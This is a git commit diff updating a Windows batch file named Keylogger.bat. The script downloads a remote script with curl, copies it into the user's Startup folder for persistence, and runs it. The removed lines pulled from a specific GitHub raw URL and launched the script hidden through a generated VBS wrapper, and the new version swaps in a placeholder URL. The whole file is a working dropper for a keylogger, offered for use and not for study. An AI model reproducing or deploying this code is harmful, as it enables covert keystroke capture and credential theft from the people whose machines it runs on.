cc337401a0e2bbad7db1017f69e7825069912683
iMakeStuff <105526428+iMakeStuff69420@users.noreply.github.com>
2023-07-05 21:36:02 -0400

    Update Keylogger.bat

--- Keylogger.bat
+++ Keylogger.bat
@@ -1,13 +1,10 @@
 @echo off
-REM You can add your own if you like, this just downloads it and puts it into a batch file and then puts it in the startup folder
-set url=https://raw.githubusercontent.com/iMakeStuff69420/Keylogger/main/Script
+
+set url=YOUR_GITHUB_RAW_URL
 set outputFile=script.bat
-set vbsScript=run.vbs
 set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 curl -o %outputFile% %url%
 copy %outputFile% %startupFolder%
-echo Set objShell = WScript.CreateObject("WScript.Shell") > %startupFolder%\%vbsScript%
-echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %startupFolder%\%vbsScript%
 
-cscript /nologo %startupFolder%\%vbsScript%
+call %startupFolder%\%outputFile%
